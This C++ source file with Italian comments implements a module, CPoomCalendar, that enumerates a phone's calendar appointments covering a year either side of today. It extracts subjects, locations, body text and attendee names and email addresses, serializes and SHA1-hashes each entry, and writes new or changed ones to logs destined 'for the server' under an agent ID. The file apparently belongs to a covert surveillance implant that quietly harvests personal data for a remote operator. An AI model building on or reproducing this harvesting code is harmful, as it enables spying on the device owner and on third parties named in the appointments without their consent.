#include "Module.h"
#include "FunctionFunc.h"
#include "PoomCommon.h"
#include "Log.h"
#include "PoomCalendar.h"
#include "hash.h"

// XXX Occhio che le funzioni OLE NON SONO thread safe, quindi questa classe
// non la possiamo richiamare da piu' thread contemporaneamente
CPoomCalendar* CPoomCalendar::m_pInstance = NULL;
volatile LONG CPoomCalendar::lLock = 0;


CPoomCalendar* CPoomCalendar::self()
{
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		_Sleep(1);

	if (m_pInstance == NULL)
		m_pInstance = new(std::nothrow) CPoomCalendar();

	InterlockedExchange((LPLONG)&lLock, 0);

	return m_pInstance;
}


void CPoomCalendar::AddAttendeeToAppointment(ATTENDEE *v,APPOINTMENTACC* appointment,int posAttendees)
{
	for (unsigned int i = 0; i < v->cProps; i++)
    {
		CEPROPVAL *ce = (CEPROPVAL *)v->rgPropVals+i; 
		CEPROPVAL *vv = ce;
		PIMPR_PROPS propid = (PIMPR_PROPS) vv->propid;
		switch (propid)
        {
			case _PIMPR_DISPLAY_NAME:
				 appointment->_attendees[posAttendees].DisplayName=vv->val.lpwstr;
#ifdef _DEBUG
				 OutputDebugString(vv->val.lpwstr);OutputDebugString(L"\n");
#endif
                 break;

            case _PIMPR_EMAIL_ADDRESS:
				 appointment->_attendees[posAttendees].EmailAddress=vv->val.lpwstr;
#ifdef _DEBUG
				 OutputDebugString(vv->val.lpwstr);OutputDebugString(L"\n");
#endif
                break;
		}

	}
}

 
void CPoomCalendar::AddPropertyToAppointment(CEPROPVAL *v,APPOINTMENTACC* appointment,WORD* yearID)
{
	PIMPR_PROPS propid = (PIMPR_PROPS) v->propid;
    if (propid <= _PIMPR_BUSY_STATUS)
    {
        if (propid > _PIMPR_SENSITIVITY)
        {
            switch (propid)
            {
                case _PIMPR_LOCATION:
					appointment->Location=v->val.lpwstr;
                    return;

                case _PIMPR_ALL_DAY_EVENT:
					//appointment->IsAllDayEvent=(BOOL)v->val.boolVal;
					if( v->val.boolVal )
						appointment->IsAllDayEvent=true;
					  else
						appointment->IsAllDayEvent=false;
                    return;

                case _PIMPR_BUSY_STATUS:
                    switch (v->val.uiVal)
                    {
                        case 0:
							appointment->Status = AppointmentStatus::Free;
                            return;

                        case 1:
							appointment->Status = AppointmentStatus::Tentative;
                            return;

                        case 2:
							appointment->Status = AppointmentStatus::Busy;
                            return;

                        case 3:
							appointment->Status = AppointmentStatus::OutOfOffice;
                            return;
                    }
                    return;
            }
        }
        else
        {
            switch (propid)
            {
                case _PIMPR_SUBJECT:
					appointment->Subject=v->val.lpwstr;
                    return;

                case _PIMPR_SENSITIVITY:
					appointment->IsPrivate=v->val.ulVal == 2;
                    break;
            }
        }
    }
    else
    {
        switch (propid)
        {
            case _PIMPR_MEETING_ORGANIZER_NAME:
				appointment->Organizer.DisplayName=v->val.lpwstr;
                break;

            case _PIMPR_MEETING_ORGANIZER_EMAIL:
				appointment->Organizer.EmailAddress=v->val.lpwstr;
                break;

            case _PIMPR_BODY_TEXT:
				appointment->Details=v->val.lpwstr;
                return;

            case _PIMPR_START:
            {
				FILETIME fileTime = {v->val.filetime.dwLowDateTime, v->val.filetime.dwHighDateTime};
				appointment->StartTime=fileTime;

				SYSTEMTIME lpUniversalTime,lpLocalTime;
                FileTimeToSystemTime(&fileTime, &lpUniversalTime);
				_SystemTimeToTzSpecificLocalTime(NULL,&lpUniversalTime ,&lpLocalTime);
				*yearID=lpLocalTime.wYear;

#if _DEBUG
				WCHAR msg[64];
				swprintf_s(msg, L"%02i/%02i/%04i %02i:%02i:%02i",lpLocalTime.wDay,lpLocalTime.wMonth,lpLocalTime.wYear,lpLocalTime.wHour,lpLocalTime.wMinute,lpLocalTime.wSecond);
				OutputDebugString(msg);OutputDebugString(L"\n");
#endif
                return;
            }
            case _PIMPR_END:
            {
				FILETIME fileTime = {v->val.filetime.dwLowDateTime, v->val.filetime.dwHighDateTime};
				appointment->EndTime=fileTime;
#if _DEBUG
				 SYSTEMTIME lpUniversalTime,lpLocalTime;
                FileTimeToSystemTime(&fileTime, &lpUniversalTime);
				_SystemTimeToTzSpecificLocalTime(NULL,&lpUniversalTime ,&lpLocalTime);
				
				WCHAR msg[64];
				swprintf_s(msg, L"%02i/%02i/%04i %02i:%02i:%02i",lpLocalTime.wDay,lpLocalTime.wMonth,lpLocalTime.wYear,lpLocalTime.wHour,lpLocalTime.wMinute,lpLocalTime.wSecond);
				OutputDebugString(msg);OutputDebugString(L"\n");
#endif
                return;
            }
        }
    }
}


DWORD CPoomCalendar::_SerializedStringLength(LPCWSTR lpString)
{
	DWORD dwStringLength = 0;

	if (lpString == NULL || wcslen(lpString) == 0)
		return 0;
	
	dwStringLength = sizeof(DWORD);
	dwStringLength += wcslen(lpString)*sizeof(WCHAR);
	
	return dwStringLength;
}

DWORD CPoomCalendar::_Prefix(DWORD dwLength, int entryType)
{
	DWORD prefix = dwLength;
	prefix &= POOM_TYPE_MASK;    // clear type bits
	prefix |= (DWORD)entryType; 

	return prefix;

}

void CPoomCalendar::_SerializeString(LPBYTE *lpDest, LPCWSTR lpString, int entryType)
{
	DWORD dwStringLength = 0;

	// if string is invalid, ignore and return 0 as length
	if (lpString == NULL)
		return;

	// if string length == 0, ignore and return 0 as length
	dwStringLength = wcslen(lpString) * sizeof(WCHAR); 

	if (dwStringLength == 0)
		return;

	// copy prefix and string *** WITHOUT NULL TERMINATOR ***
	DWORD prefix = _Prefix(dwStringLength, entryType << 0x18);
	CopyMemory(*lpDest, &prefix, sizeof(prefix));
	CopyMemory((*lpDest + sizeof(prefix)), lpString, dwStringLength);

	*lpDest+=(sizeof(prefix) + dwStringLength);
}


#define MAX_APPOINTMENT 2000

CPoomCalendar::CPoomCalendar():requestedCount(REQ_COUNT),m_bIsValid(FALSE),handleCount(0)
{
	err=_PoomDataServiceClient_Init();


	if (err==0) 
		m_bIsValid = TRUE;
	
}

UINT CPoomCalendar::SerilaizeAppointment(UINT i, LPBYTE *retlpOutBuf,APPOINTMENTACC* appointment)
{
	APPOINTMENT* ptrArr;
	WORD yearID=0;
		
	ptrArr=contacts[i];		
		
	for(unsigned int j=0; j<ptrArr->cProps; j++)
	{
		CEPROPVAL *ce = (CEPROPVAL *)ptrArr->rgPropVals+j; 
		CEPROPVAL *v = ce;
		AddPropertyToAppointment(v,appointment,&yearID);

	}


	appointment->NumAttendees=ptrArr->cAttendees;
	for(unsigned int j=0; j<ptrArr->cAttendees; j++)
	{
		ATTENDEE *ce = (ATTENDEE *)ptrArr->rgAttendees+j; 
		ATTENDEE *v = ce;
		AddAttendeeToAppointment(v,appointment,j);
	}

	appointment->Id=ptrArr->appointmentId;

	FILETIME fileTime = {ptrArr->ftOriginal.dwLowDateTime,ptrArr->ftOriginal.dwHighDateTime};
	appointment->OriginalStart=fileTime;

		
	ACCOUNT*	ptrAcc=(ACCOUNT*)ptrArr->pAccount;
	CEPROPVAL *ce = (CEPROPVAL *)ptrAcc->rgPropVals; 
	CEPROPVAL *v = ce;
	appointment->CalendarFrom=(LPCWSTR)v->val.lpwstr;

	//per ovviare ai duplicati id  di natale capodanno ecc.. modifico l'id aggiungendogli l'anno
	//sposto l'id su di 1 byte e mezzo cosi' ci storo la data che va dall'anno 0 a 4095
	appointment->Id=appointment->Id<<12;
	appointment->Id+=yearID;

	//ho raccolto tutte le info che mi servono

	DWORD dwDynLen = 0;
	LPBYTE pPtr = NULL, lpOutBuf = NULL;
	HeaderCalendarStruct header;
	DWORD lpdwOutLength;
	LONG lTmp = 0;

	header.dwVersion=POOM_V1_0_PROTO;
	header.lOid=appointment->Id;

	//Header
	lpdwOutLength = sizeof(HeaderCalendarStruct);
	//Flags
	lpdwOutLength += sizeof(DWORD);
	//Start date 
	lpdwOutLength += sizeof(FILETIME);
	//end date 
	lpdwOutLength += sizeof(FILETIME);
	//Sensitivity
	lpdwOutLength += sizeof(LONG);
	//Busy Status
	lpdwOutLength += sizeof(LONG);
	//Duration
	lpdwOutLength += sizeof(LONG);
	//Meeting Status
	lpdwOutLength += sizeof(LONG);


	lpdwOutLength += _SerializedStringLength(appointment->Subject);
	lpdwOutLength += _SerializedStringLength(appointment->Location);
	lpdwOutLength += _SerializedStringLength(appointment->Details);
		
	wstring addAttendee;
		
	addAttendee += appointment->CalendarFrom;
	addAttendee += L" Calendar ";
	if (appointment->NumAttendees!=0) addAttendee += L" - Attendee: ";
	for(int j=0;j<appointment->NumAttendees;j++)
	{
		addAttendee += L" { ";
		addAttendee += appointment->_attendees[j].DisplayName;
		addAttendee += L" , "; 
		addAttendee += appointment->_attendees[j].EmailAddress;
		addAttendee += L" } "; 
	}
	lpdwOutLength += _SerializedStringLength(addAttendee.c_str());

	header.dwSize = lpdwOutLength;
	lpOutBuf = new(std::nothrow) BYTE[lpdwOutLength];

	pPtr = lpOutBuf;

	//HeaderCalendar
	CopyMemory( pPtr, &header, sizeof(HeaderCalendarStruct));
	pPtr += sizeof(HeaderCalendarStruct);

	// Flags
	lTmp = appointment->IsAllDayEvent;
	CopyMemory(pPtr, &lTmp, sizeof(DWORD));
	pPtr += sizeof(DWORD);

	// StartDate + EndDate
	CopyMemory(pPtr, &appointment->StartTime, sizeof(FILETIME));
	pPtr += sizeof(FILETIME);

	CopyMemory(pPtr, &appointment->EndTime, sizeof(FILETIME));
	pPtr += sizeof(FILETIME);


	//Sensitivity
	lTmp = appointment->IsPrivate;
	CopyMemory(pPtr, &lTmp, sizeof(LONG));
	pPtr += sizeof(LONG);
	//Busy Status
	lTmp = appointment->Status;
	CopyMemory(pPtr, &lTmp, sizeof(LONG));
	pPtr += sizeof(LONG);
	//Duration		
	lTmp = 0;
	CopyMemory(pPtr, &lTmp, sizeof(LONG));
	pPtr += sizeof(LONG);
	//Meeting Status		
	lTmp = 0;
	CopyMemory(pPtr, &lTmp, sizeof(LONG));
	pPtr += sizeof(LONG);

	_SerializeString(&pPtr, appointment->Subject, POOM_STRING_SUBJECT);
	_SerializeString(&pPtr, appointment->Location, POOM_STRING_LOCATION);
	_SerializeString(&pPtr, appointment->Details, POOM_STRING_BODY);
	_SerializeString(&pPtr, addAttendee.c_str(), POOM_STRING_RECIPIENTS);

#ifdef _DEBUG

	WCHAR msg[256];
	swprintf_s(msg, L"Id=%02i\n i=%02i Subject=%s Location=%s Status=%02i IsAllDayEvent=%02i IsPrivate=%02i\n",appointment->Id,i,appointment->Subject,appointment->Location,appointment->Status,appointment->IsAllDayEvent,appointment->IsPrivate);
	//if(appointment->IsAllDayEvent==false) 
	OutputDebugString(msg);
		if (i==50)
			i=i;
#endif


	*retlpOutBuf=lpOutBuf;
	return lpdwOutLength;
}

UINT CPoomCalendar::LoadMarkup(UINT uAgentId)
{
	//leggo dal markup lo sha1 dei singoli contatti del Calendar  e riempio la struttura
	BYTE *pBuf = NULL;
	UINT uSize;
	UINT numMarkupAppointment=0;
	
	Log pPOOMMarkupRead = Log();

	//se esiste un markup lo carico
	if (pPOOMMarkupRead.IsMarkup(uAgentId))
	{
		pBuf = pPOOMMarkupRead.ReadMarkup(uAgentId, &uSize);

		numMarkupAppointment=uSize/sizeof(identifyAppointment);
		identifyAppointment* storeMarkupContact;
		storeMarkupContact=(identifyAppointment*)pBuf;

		calendarMapSha1.clear();

		for(unsigned int j=0;j<numMarkupAppointment;j++)
		{
			identifyAppointment IdSha1;
			IdSha1.ID=storeMarkupContact->ID;
			memcpy(IdSha1.sha1,storeMarkupContact->sha1,sizeof(IdSha1.sha1));
			IdSha1.sha1flag=0;
			calendarMapSha1[storeMarkupContact->ID]=IdSha1;
			storeMarkupContact++;
		}

		//ho storato tutto in addressbookMapSha1 per cui posso liberare la memoria
		SAFE_DELETE(pBuf);
	}

	return numMarkupAppointment;
}

void CPoomCalendar::SaveMarkup(UINT uAgentId,BYTE* storeMarkupAppointment,UINT size)
{
	Log pPOOMMarkupWrite = Log();
	pPOOMMarkupWrite.RemoveMarkup(uAgentId);
	pPOOMMarkupWrite.WriteMarkup(uAgentId,storeMarkupAppointment, size);

}

void CPoomCalendar::Run(UINT uAgentId)
{
	BYTE sha1[20];
	Hash hash;
	SYSTEMTIME st;
	DWORD lpdwOutLength;

	handleCount=0;

	ZeroMemory(&st, sizeof(st));
	GetSystemTime(&st);

#ifdef _DEBUG
//	err=_PoomDataServiceClient_GetObjectsEnumerator(L"Appointments: Start=03.02.2013.00.00 End=03.05.2013.00.00 Max=2000",&hPoom);
	WCHAR PoomQuery[128];
	swprintf_s(PoomQuery, L"Appointments: Start=%02i.%02i.%04i.00.00 End=%02i.%02i.%04i.00.00 Max=%i",st.wMonth,st.wDay,st.wYear-1,st.wMonth,st.wDay,st.wYear+1,MAX_APPOINTMENT);
	err=_PoomDataServiceClient_GetObjectsEnumerator(PoomQuery,&hPoom);

#else
	//preparo una query per scandagliare gli appuntamenti del precedenta anno e del futuro anno
	WCHAR PoomQuery[128];
	swprintf_s(PoomQuery, L"Appointments: Start=%02i.%02i.%04i.00.00 End=%02i.%02i.%04i.00.00 Max=%i",st.wMonth,st.wDay,st.wYear-1,st.wMonth,st.wDay,st.wYear+1,MAX_APPOINTMENT);
	err=_PoomDataServiceClient_GetObjectsEnumerator(PoomQuery,&hPoom);
#endif
	
	//_PIMPR_ERROR_NOT_FOUND significa che ci sono 0 contatti
	if(err==_PIMPR_ERROR_NOT_FOUND||err==_PIMPR_ERROR_ACCESS_DENIED)
		 return;

	err=_PoomDataServiceClient_MoveNext(hPoom,requestedCount,&handleCount,ptrArray); //in handleCount mi ritrovo il numero di contatti che ho

	if(handleCount==0||err!=0) 
	{
		_PoomDataServiceClient_FreeEnumerator(hPoom);
		return;
	}

	contacts = (APPOINTMENT **) ptrArray;
	
	UINT numMarkupContact=LoadMarkup(uAgentId);

	for(unsigned int i=0; i < handleCount; i++)
	{
#if _DEBUG
		WCHAR msg[64];
		swprintf_s(msg, L"\nAPPOINTMENT %02i/%02i:\n",i,handleCount-1);
		OutputDebugString(msg);
#endif
		LPBYTE lpOutBuf = NULL;
		//deserializzo APPOINTMENT // APPOINTMENTSerializer 
		APPOINTMENTACC appointment={0};
		
		lpdwOutLength=SerilaizeAppointment(i, &lpOutBuf,&appointment);



		//se l'id del corrente contatto è presente nel markup

			//carico lo sha1 dell'id del contatto e lo confronto con quello del markup 
			//se lo sha è uguale allora il contatto non è stato modificato per cui non c'e' bisogno che creo il log x il server => sha1flag=1
			//se lo sha è diverso significa che il contatto è stato modificato per cui aggiorno il markup e creo il log x il server => sha1flag=2

		//se l'id non è presente nel markup creo il log x il server e aggiungo l'elemanto nel markup=> sha1flag=3

		//calcolo l'hash del contatto i
		hash.Sha1((UCHAR *)lpOutBuf, lpdwOutLength, sha1);
				
		identifyAppointment AppointmentFromId=calendarMapSha1[appointment.Id];
			
		BYTE bufNULL[20]={0};
		//se lo sha1 non è null entro
		if(memcmp(AppointmentFromId.sha1,bufNULL,sizeof(bufNULL))!=0)
		{
			if(!memcmp(AppointmentFromId.sha1,sha1,sizeof(sha1))==0)
			{
				//se lo sha è diverso significa che il contatto è stato modificato per cui aggiorno il markup e creo il log x il server => sha1flag=2
				//rimuovo il contatto nel il markup vecchio
				calendarMapSha1.erase(appointment.Id);


				//aggiungo il nuovo elemento nel markup e nel log per il server
				identifyAppointment IdSha1;
				IdSha1.ID=appointment.Id;
				memcpy(IdSha1.sha1,sha1,sizeof(IdSha1.sha1));
				IdSha1.sha1flag=2;

				calendarMapSha1[appointment.Id]=IdSha1;

				Log poomLog = Log();

				if (lpOutBuf) {
					poomLog.CreateLog(LOGTYPE_CALENDAR, NULL, 0, FLASH);
					poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
					poomLog.CloseLog();
					//SAFE_DELETE(lpOutBuf);
				}
			}
			else
			{
						//se lo sha è uguale allora il contatto non è stato modificato per cui non c'e' bisogno che creo il log x il server => sha1flag=1
						AppointmentFromId.sha1flag=1;
						calendarMapSha1[appointment.Id]=AppointmentFromId;

			}
				

		}
		else
		{   //se l'id non è presente nel markup creo il log x il server e aggiungo l'elemanto nel markup=> sha1flag=3

			identifyAppointment IdSha1;
			IdSha1.ID=appointment.Id;
			memcpy(IdSha1.sha1,sha1,sizeof(IdSha1.sha1));
			IdSha1.sha1flag=3;
				
			calendarMapSha1[appointment.Id]=IdSha1;



			Log poomLog = Log();

			if (lpOutBuf) {
				poomLog.CreateLog(LOGTYPE_CALENDAR, NULL, 0, FLASH);
				poomLog.WriteLog(lpOutBuf, lpdwOutLength);			
				poomLog.CloseLog();
				//SAFE_DELETE(lpOutBuf);
			}
		}


		SAFE_DELETE(lpOutBuf);

	}


	//alla fine devo parsare tutti i markup è quelli contrassegnati con 0 significa che non sono piu' presenti nell'addressbook per cui li devo rimuovere dal markup

	std::map<ULONG, identifyAppointment>::iterator calendarIt=calendarMapSha1.begin(); 
	while(calendarIt != calendarMapSha1.end())
	{
		if (calendarIt->second.sha1flag==0)
		{
			calendarMapSha1.erase(calendarIt++->second.ID);  // Use iterator.
									  // Note the post increment.
									  // Increments the iterator but returns the
									  // original value for use by erase 
		}
		else
		{
			++calendarIt;           // Can use pre-increment in this case
							   // To make sure you have the efficient version
		}
	}


	
	identifyAppointment* storeMarkupAppointment= new identifyAppointment[calendarMapSha1.size()];
	
	int calendarPos=0;
	for (std::map<ULONG, identifyAppointment>::iterator calendarIt=calendarMapSha1.begin(); calendarIt != calendarMapSha1.end(); ++calendarIt)
	{
			storeMarkupAppointment[calendarPos].ID=calendarIt->second.ID;
			memcpy(storeMarkupAppointment[calendarPos].sha1,calendarIt->second.sha1,sizeof(storeMarkupAppointment[calendarPos].sha1));
			storeMarkupAppointment[calendarPos].sha1flag=0;
			calendarPos++;
	}

	SaveMarkup(uAgentId,(BYTE *)storeMarkupAppointment,sizeof(identifyAppointment)*calendarPos);





	//dealloco gli oggetti
	for(unsigned int i=0; i < handleCount; i++)
	{
		_PoomDataServiceClient_FreeObject((DWORD*)contacts[i]);
	}

	_PoomDataServiceClient_FreeEnumerator(hPoom);

}

CPoomCalendar::~CPoomCalendar()
{
	CPoomCalendar::m_pInstance = NULL;
}